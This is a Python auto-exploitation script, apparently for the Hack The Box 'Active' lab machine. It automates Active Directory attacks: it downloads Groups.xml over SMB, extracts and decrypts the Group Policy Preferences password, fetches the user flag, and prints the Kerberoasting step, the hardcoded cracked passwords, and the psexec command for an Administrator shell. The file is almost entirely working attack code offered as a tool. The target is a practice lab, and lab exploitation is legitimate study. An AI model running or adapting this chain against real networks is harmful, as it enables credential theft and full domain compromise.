import sys, os, requests, re, subprocess
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Active
    __________________________________________________________________________\n"""
    print(Fore.RED + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] SVC_TGS", "[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.100" 

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://10.10.10.100/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Active Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        commands_send("smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml")
        print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ Successful create file.");print(ln)
        
        
def svc_tgs_smb_connect():
    commands_send('smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml')
    gpp_encrypted=commands_send('cat 10.10.10* | grep -o \'cpassword="[^"]*"\' | awk -F\'=\' \'{print $2}\' | tr -d \'"\'')
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.LIGHTMAGENTA_EX + f"Getting hash :)");cm.sleep(2)
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ Cracked hash Successful")
    password_decrypted=commands_send(f"gpp-decrypt '{gpp_encrypted}'")
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ Hash Password → " + Fore.GREEN + f"{password_decrypted}");cm.sleep(.7)
    commands_send("rm 10.10.*")
    commands_send(f"smbmap -H '10.10.10.100' -u 'SVC_TGS' -p '{password_decrypted}' --download Users/SVC_TGS/Desktop/user.txt")
    flag_svc_tgs=commands_send("cat 10.10.**")
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ SVC_TGS Flag User → " + Fore.GREEN + f"{flag_svc_tgs}");cm.sleep(.7);print(ln)

def administrator_connect():
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.LIGHTMAGENTA_EX + f"kerberoasting svc_tgs user");cm.sleep(1)
    commands_send(f"GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request > data.txt")
    commands_send("cat data.txt | grep -vE \"[-]|Service\" | xargs > hash")
    commands_send("rm data.txt")
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.LIGHTMAGENTA_EX + f"✔ John force cracked hash");cm.sleep(2)
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ Hash Password → " + Fore.GREEN + f"Ticketmaster1968");cm.sleep(.7)
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ Exec command → " + Fore.GREEN + f"psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe");cm.sleep(.7)
    print(tmsg,Fore.RED + f"[Exploit - Message] > " + Fore.YELLOW + f"✔ Exec command → " + Fore.GREEN + f"type C:/Users/Administrator/Desktop/root.txt");cm.sleep(.7);print(ln)

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","SVC_TGS user connection"))
                print(tmsg,Fore.RED + f"[Exploit - SMB Path] > " + Fore.YELLOW + f"Replication/../../Groups.xml");cm.sleep(.5)
                svc_tgs_smb_connect()
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator user connection"))
                administrator_connect()
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
